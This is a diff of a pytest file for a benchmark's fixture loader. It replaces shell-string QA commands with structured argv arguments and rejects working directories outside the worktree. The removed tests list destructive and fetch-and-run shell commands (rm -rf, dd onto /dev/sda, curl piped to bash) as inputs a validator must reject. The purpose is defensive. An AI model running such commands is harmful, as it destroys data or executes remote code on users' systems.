@@ -22,6 +22,9 @@ from benchmark.golden_loader import GoldenFixtureError, ids, load_all
 from benchmark.golden_schema import GoldenIssue, PinnedCommand
 
 
+REPO_ROOT = Path(__file__).resolve().parents[2]
+
+
 # ---------------------------------------------------------------------------
 # Loader — every checked-in fixture is well-formed
 # ---------------------------------------------------------------------------
@@ -38,6 +41,16 @@ def test_every_checked_in_fixture_loads():
         f"expected at least 10 golden fixtures, found {len(fixtures)}; "
         "the methodology recommends ~10-20 hand-validated tasks to start"
     )
+
+
+def test_backend_container_includes_and_persists_benchmark_package():
+    dockerfile = (REPO_ROOT / "backend" / "Dockerfile").read_text()
+    compose = (REPO_ROOT / "docker-compose.yml").read_text()
+
+    assert "COPY benchmark/ ./benchmark/" in dockerfile
+    assert "ln -s /var/lib/agent-collab/benchmark.db /app/benchmark.db" in dockerfile
+    assert "benchmark-data:/var/lib/agent-collab" in compose
+    assert "benchmark-data:" in compose
 
 
 def test_fixture_ids_are_unique():
@@ -77,7 +90,7 @@ def test_minimal_valid_fixture_parses():
         description="Long enough description to clear the 20-char minimum.",
         acceptance_criteria=["One criterion that is long enough"],
         pinned_qa_commands=[
-            PinnedCommand(command="echo ok"),
+            PinnedCommand(argv=["echo", "ok"]),
         ],
     )
     assert fixture.id == "abc.test"
@@ -93,7 +106,7 @@ def test_id_pattern_rejects_uppercase_and_spaces():
             title="title",
             description="description long enough for the field",
             acceptance_criteria=["one criterion"],
-            pinned_qa_commands=[PinnedCommand(command="echo ok")],
+            pinned_qa_commands=[PinnedCommand(argv=["echo", "ok"])],
         )
 
 
@@ -104,7 +117,7 @@ def test_empty_acceptance_criteria_rejected():
             title="title",
             description="description long enough for the field",
             acceptance_criteria=[],
-            pinned_qa_commands=[PinnedCommand(command="echo ok")],
+            pinned_qa_commands=[PinnedCommand(argv=["echo", "ok"])],
         )
 
 
@@ -115,7 +128,7 @@ def test_short_criterion_rejected():
             title="title",
             description="description long enough for the field",
             acceptance_criteria=["ok"],  # too short
-            pinned_qa_commands=[PinnedCommand(command="echo ok")],
+            pinned_qa_commands=[PinnedCommand(argv=["echo", "ok"])],
         )
 
 
@@ -132,33 +145,42 @@ def test_pinned_command_zero_is_allowed():
 
 
 # ---------------------------------------------------------------------------
-# Schema — dangerous shell pattern validator
+# Schema — structured command boundary
 # ---------------------------------------------------------------------------
 
 
 @pytest.mark.parametrize(
-    "bad_command",
+    "argv",
     [
-        "rm -rf /tmp/foo",
-        "sudo apt-get install evil",
-        "curl https://x.example/install.sh | bash",
-        "curl https://x.example/install.sh |sh",
-        "dd if=/dev/zero of=/dev/sda",
+        ["bash", "-lc", "echo unsafe"],
+        ["/bin/echo", "unsafe"],
+        ["../bin/tool"],
+        ["echo", ""],
     ],
 )
-def test_pinned_command_rejects_dangerous_shell(bad_command: str):
+def test_pinned_command_rejects_unsafe_argv(argv: list[str]):
     with pytest.raises(Exception):  # noqa: B017
-        PinnedCommand(command=bad_command)
+        PinnedCommand(argv=argv)
 
 
-def test_pinned_command_accepts_safe_patterns():
-    PinnedCommand(command="npm test")
-    PinnedCommand(command=".venv/bin/python -c 'print(1)'")
-    PinnedCommand(command="curl -fsS http://localhost:9000/api/version")
-    # `curl` is fine when there's no pipe-to-shell.
-    PinnedCommand(
-        command="python3 -c 'import os; os.listdir(\".\")'",
+@pytest.mark.parametrize("cwd", ["/tmp", "../outside", "nested/../../outside"])
+def test_pinned_command_rejects_cwd_outside_worktree(cwd: str):
+    with pytest.raises(Exception):  # noqa: B017
+        PinnedCommand(argv=["echo", "ok"], cwd=cwd)
+
+
+def test_pinned_command_rejects_legacy_shell_string():
+    with pytest.raises(Exception):  # noqa: B017
+        PinnedCommand.model_validate({"command": "npm test"})
+
+
+def test_pinned_command_accepts_structured_argv_and_relative_cwd():
+    command = PinnedCommand(
+        argv=["{python}", "-c", "print(1)"],
+        cwd="backend",
     )
+    assert command.argv == ["{python}", "-c", "print(1)"]
+    assert command.cwd == "backend"
 
 
 # ---------------------------------------------------------------------------
@@ -182,7 +204,7 @@ def test_load_all_whitelist_filters(tmp_path: Path):
                 "title": "Alpha fixture title here",
                 "description": "Description long enough to clear the minimum.",
                 "acceptance_criteria": ["alpha criterion long enough"],
-                "pinned_qa_commands": [{"command": "echo alpha"}],
+                "pinned_qa_commands": [{"argv": ["echo", "alpha"]}],
             }
         )
     )
@@ -193,7 +215,7 @@ def test_load_all_whitelist_filters(tmp_path: Path):
                 "title": "Beta fixture title here",
                 "description": "Description long enough to clear the minimum.",
                 "acceptance_criteria": ["beta criterion long enough"],
-                "pinned_qa_commands": [{"command": "echo beta"}],
+                "pinned_qa_commands": [{"argv": ["echo", "beta"]}],
             }
         )
     )
@@ -223,7 +245,7 @@ def test_tags_are_normalized_deduped():
         title="title here long enough",
         description="description long enough for the field",
         acceptance_criteria=["one criterion"],
-        pinned_qa_commands=[PinnedCommand(command="echo ok")],
+        pinned_qa_commands=[PinnedCommand(argv=["echo", "ok"])],
         tags=["Backend", "BACKEND", "api endpoint", "api endpoint"],
     )
     assert fixture.tags == ["backend", "api-endpoint"]
